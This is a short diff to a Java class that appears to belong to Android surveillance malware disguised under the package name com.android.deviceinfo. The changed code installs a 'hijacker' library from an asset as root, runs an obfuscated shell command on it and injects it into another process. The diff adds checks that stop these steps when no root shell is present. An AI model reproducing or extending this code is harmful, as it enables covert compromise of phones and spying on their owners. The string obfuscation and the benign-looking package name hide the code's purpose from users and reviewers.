@@ -1,11 +1,9 @@
 package com.android.deviceinfo.util;
 
-import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
-import java.io.InputStreamReader;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
@@ -40,6 +38,14 @@ public class Instrument {
 		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so
 
 		try {
+			if (Root.isRootShellInstalled() == false) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(installHijacker): Nope, we are not root");
+				}
+				
+				return false;
+			}
+			
 			// Install library
 			Root.fileWrite(lib, stream, Cfg.RNDDB);
 			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + path + "/" + lib);
@@ -73,6 +79,14 @@ public class Instrument {
 	}
 
 	public void startInstrumentation() {
+		if (Root.isRootShellInstalled() == false) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
+			}
+			
+			return;
+		}
+		
 		int pid = getProcessPid();
 
 		if (pid > 0) {
